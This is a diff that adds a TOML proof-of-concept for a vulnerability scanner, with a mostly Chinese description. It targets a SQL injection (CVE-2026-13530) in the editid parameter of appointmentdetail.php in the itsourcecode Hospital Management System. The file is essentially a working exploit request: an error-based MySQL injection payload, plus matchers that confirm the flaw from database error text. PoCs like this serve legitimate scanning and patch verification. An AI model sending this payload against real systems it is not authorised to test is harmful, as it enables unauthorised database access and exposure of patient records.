@@ -1,0 +1,38 @@
+[info]
+id = "POC-AVE-2026-0015"
+name = "itsourcecode Hospital Management System SQL注入漏洞 PoC"
+author = "AVE"
+severity = "medium"
+tags = ["sql-injection", "cve-2026-13530"]
+description = "itsourcecode Hospital Management System V1.0 /appointmentdetail.php 文件 editid 参数存在 SQL 注入漏洞，攻击者可通过构造恶意 payload 进行错误注入"
+vuln_id = ["CVE-2026-13530", "AVE-2026-0015"]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/appointmentdetail.php"
+query.editid = "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(2782=2782,1))),0x717a7a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -"
+
+[[poc.requests.headers]]
+User-Agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["SQL syntax", "MySQL", "Duplicate entry", "Warning"]
+expect = true
+
+[[poc.requests]]
+method = "GET"
+path = "/appointmentdetail.php"
+query.editid = "1"
+
+[[poc.requests.headers]]
+User-Agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
